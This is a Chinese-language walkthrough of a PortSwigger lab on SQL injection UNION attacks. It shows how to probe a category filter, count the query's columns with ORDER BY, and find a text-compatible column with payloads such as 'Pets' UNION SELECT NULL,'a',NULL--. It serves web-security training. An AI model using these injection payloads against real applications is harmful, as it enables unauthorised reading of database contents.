# 实验：SQL 注入 UNION 攻击，查找包含文本的列

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，你首先需要确定查询返回的列数。你可以使用在[上一个实验](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)中学到的技术来完成这一步。下一步是识别一个与字符串数据兼容的列。

实验室将提供一个随机值，你需要使其出现在查询结果中。为了解决本实验，请执行一个 SQL 注入 UNION 攻击，该攻击返回包含所提供值的额外行。此技术有助于你确定哪些列与字符串数据兼容。

## 步骤

页面头部显示 lab 的随机值 
`Make the database retrieve the string: 'a5myKm'`

探测
- 使用检索的过滤器
    - 请求
        ```http
        GET /filter?category=Pets HTTP/2
        ```
- 测试经典的1/2个单引号的字符串型 SQLi 注入点
    - 出现经典的失败/成功，字符串型注入点行为

- 使用 order by 测试列数
    - 列数3

- 使用联合查询测试字符串型列
    ```sql
    $input='Pets' UNION SELECT NULL,'a',NULL--
    ```
    - 列2为字符串型
    - 同时推断非 Oracle（无表） 或 MySQL（无注释横线后的空格）

- 设置 lab 随机值到联合查询
    ```sql
    $input='Pets' UNION SELECT NULL,'a5myKm',NULL--
    ```
